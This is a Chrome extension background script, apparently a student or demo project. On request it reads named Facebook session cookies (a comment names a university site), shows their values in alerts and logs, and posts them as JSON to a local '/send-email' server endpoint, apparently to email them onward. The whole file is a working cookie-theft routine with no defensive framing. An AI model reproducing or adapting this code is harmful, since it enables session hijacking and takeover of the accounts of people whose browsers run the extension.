let cookieValues = [];

chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
    console.log('Message received:', message); // test
    if (message.type === 'READ_COOKIE') {
        message.payload.forEach(name => {
            chrome.cookies.getAll({ url: 'https://www.facebook.com/', name: name}, (cookies) => { //https://e3p.nycu.edu.tw/my/
                if (cookies.length > 0) {
                    // Process all cookies or just the first one
                    console.log('Cookies found: ' + cookies.length);
                    cookies.forEach(cookie => {
                        console.log('Cookie value: ' + cookie.value);
                        alert('Cookie value: ' + cookie.value); // You might want to adjust how you show multiple cookies
                        cookieValues.push(cookie.value);
                    });
                    
                    alert('Sending cookies to server: ', cookieValues);
                    // 將 Cookie 值發送到後端服務器
                    fetch('http://localhost:3000/send-email', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ cookies: cookieValues })
                    })
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            alert('success')
                            console.log('Email sent successfully!');
                        } else {
                            alert('fail')
                            console.log('Failed to send email.');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });

                } else {
                    console.log('No cookies found!');
                    alert('No cookies found!');
                }
            });
        });
    }
});
